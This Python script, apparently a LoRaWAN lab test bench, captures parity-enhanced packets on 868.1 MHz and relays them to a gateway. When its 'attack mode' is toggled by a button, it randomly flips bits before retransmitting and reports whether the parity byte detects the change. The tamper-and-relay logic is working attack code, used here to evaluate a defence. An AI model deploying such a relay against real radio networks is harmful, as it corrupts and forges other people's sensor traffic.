#!/usr/bin/env python3
import random
import time
import RPi.GPIO as GPIO

from SX127x import LoRa
from SX127x.LoRa import MODE
from SX127x.board_config import BOARD2
from SX127x.constants import BW, CODING_RATE

GPIO.setwarnings(False)

BUTTON_PIN = 26
GPIO.setmode(GPIO.BCM)
GPIO.setup(BUTTON_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)

FREQUENCY = 868.1
SPREADING_FACTOR = 7
STANDARD_LENGTH = 24      # Normal LoRaWAN packet length from the Dragino
EXPECTED_LENGTH = 25      # Standard + 1 parity byte = enhanced packet




def get_irq_flags(lora):
    if hasattr(lora, "get_irq_flags"):
        return lora.get_irq_flags()
    if hasattr(lora, "read_irq_flags"):
        return lora.read_irq_flags()
    raise RuntimeError("No IRQ flag method found")


def flag_is_set(flags, name):
    value = flags.get(name, 0)
    if isinstance(value, bool):
        return value
    return value == 1


def has_crc_error(flags):
    return any(flags.get(k) for k in (
        "payload_crc_error", "PayloadCrcError",
        "crc_error", "RxPayloadCrcError",
    ))


def devaddr_fcnt(payload):
    dev_addr = "".join(f"{b:02x}" for b in payload[1:5][::-1])
    fcnt = payload[6] 
    return dev_addr, fcnt


def verify_parity(payload):
    #check if the last byte computed vs epxected 
    data = payload[:-1]
    parity_byte = payload[-1]
    computed = 0
    for b in data:
        computed ^= (b & 0xFF)
    if computed == parity_byte:
        return True
    else:
        return False, computed, parity_byte


def transmit(lora, payload_bytes):
    #Switch to TX, send payload, wait for TxDone, back to Standby to recieve more
    lora.set_mode(MODE.STDBY)
    time.sleep(0.01)
    lora.write_payload(list(payload_bytes))
    lora.set_mode(MODE.TX)

    t0 = time.time()
    while (time.time() - t0) < 3.0:
        flags = get_irq_flags(lora)
        if flags.get("tx_done") or flags.get("TxDone"):
            break
        time.sleep(0.005)

    lora.clear_irq_flags(TxDone=1)
    lora.set_mode(MODE.STDBY)
    time.sleep(0.5)


def rx_read(lora):
    #Check if a packet arrived. Returns bytearray or None.
    flags = get_irq_flags(lora)

    if not (flag_is_set(flags, "RxDone") or flag_is_set(flags, "rx_done")):
        return None

    lora.clear_irq_flags(RxDone=1)

    if has_crc_error(flags):
        lora.clear_irq_flags(PayloadCrcError=1)
        lora.reset_ptr_rx()
        lora.set_mode(MODE.RXCONT)
        return None

    try:
        raw = lora.read_payload(nocheck=True) or []
    except Exception as e:
        print(f"  Read error: {e}")
        lora.reset_ptr_rx()
        lora.set_mode(MODE.RXCONT)
        return None

    if not raw or len(raw) < 8:
        lora.reset_ptr_rx()
        lora.set_mode(MODE.RXCONT)
        return None

    return bytearray(raw)


def start_rx(lora):
    #Put radio into continuous receive mode.
    lora.set_mode(MODE.STDBY)
    lora.clear_irq_flags(RxDone=1, PayloadCrcError=1, TxDone=1,
                         ValidHeader=1, FhssChangeChannel=1, CadDone=1, CadDetected=1)
    lora.reset_ptr_rx()
    lora.set_mode(MODE.RXCONT)


def init_radio(board):
    # SX1276 for 868.1 MHz SF7 LoRaWAN.
    LoRa.BOARD = board
    LoRa.LoRa.spi = board.SpiDev()

    lora = LoRa.LoRa(verbose=False)

    lora.set_mode(MODE.SLEEP)
    lora.set_dio_mapping([0, 0, 0, 0, 0, 0])
    lora.set_mode(MODE.STDBY)

    lora.set_freq(FREQUENCY)
    lora.set_pa_config(pa_select=1)
    lora.set_rx_crc(True)
    lora.set_sync_word(0x34)
    lora.set_spreading_factor(SPREADING_FACTOR)
    lora.set_bw(BW.BW125)
    lora.set_coding_rate(CODING_RATE.CR4_5)
    lora.set_preamble(8)
    lora.set_low_data_rate_optim(False)
    lora.set_implicit_header_mode(False)

    lora.reset_ptr_rx()
    lora.clear_irq_flags(RxDone=1, PayloadCrcError=1)

    return lora

def expected_parity_str(payload):
    #read last byte as the parity
    parity = payload[:-1]
    return parity

def computed_parity(payload):
    #computer parity based on the rest of bytes
    computed = 0
    for b in payload[:-1]:
        computed ^= (b & 0xFF)
    return computed


def main():
    attack_mode = False
    

    
    print("  LoRaWAN Bit Flipper")
    print(f"  Frequency: {FREQUENCY} MHz  SF{SPREADING_FACTOR}")
    print(f"  Accepts only: {EXPECTED_LENGTH}-byte packets (with parity)")
    

    BOARD2.setup()
    lora = init_radio(BOARD2)
    packets = 0

    start_rx(lora)
    print("\nListening. Press Ctrl+C to stop.\n")

    btn_last = GPIO.input(BUTTON_PIN) 

    try:
        while True:
            #set button to pin 16
            btn_now = GPIO.input(BUTTON_PIN)
            if btn_last == 1 and btn_now == 0:  # falling edge 
                attack_mode = not attack_mode
                state_str = "ON" if attack_mode else "OFF"
                print(f"  [Button] Attack mode toggled: {state_str}")
                time.sleep(0.05)  # debounce
            btn_last = btn_now

            payload = rx_read(lora)

            if payload is not None:
                dev_addr, fcnt = devaddr_fcnt(payload)

                if len(payload) != EXPECTED_LENGTH:
                    print(f"  Ignored: {len(payload)}-byte packet ")
                    start_rx(lora)
                    continue

                if dev_addr is None:
                    start_rx(lora)
                    continue

                print(f"[Radio] ── Captured parity-enhanced packet ──")
                print(f"  DevAddr  : {dev_addr}  FCnt: {fcnt}")
                print(f"  Payload  : {' '.join(f'{b:02x}' for b in payload)}")

                if attack_mode:
                    rand_amount = random.randint(1, 5)
                    flip_indices = random.sample(range(len(payload) - 1), rand_amount)
                    for idx in flip_indices:
                        payload[idx] ^= 0x01#flip a bit in a random position but not the last positition
                    print(f"  After    : {' '.join(f'{b:02x}' for b in payload)}")
                    parity_detected = payload[-1] != computed_parity(payload)
                    print(f"  Expected parity: 0x{payload[-1]:02x}  Computed parity: 0x{computed_parity(payload):02x}")
                    print(f"  [Attack] flipped {rand_amount} byte(s), parity detected: {parity_detected}")
                else:
                    print(f"  Attack mode OFF — retransmitting unmodified")

                # Retransmit packet to RAK gateway
                transmit(lora, payload)
                packets += 1
                print(f"[Radio] ── Retransmitted to gateway ({packets} total) ──\n")

                start_rx(lora)

            time.sleep(0.005)

    except KeyboardInterrupt:
        print(f"\nStopping.")
        print(f"  {packets} packets retransmitted")

    finally:
        try:
            BOARD2.led_off()#not used
        except Exception:
            pass
        lora.set_mode(MODE.SLEEP)
        BOARD2.teardown()
        GPIO.cleanup()


if __name__ == "__main__":
    main()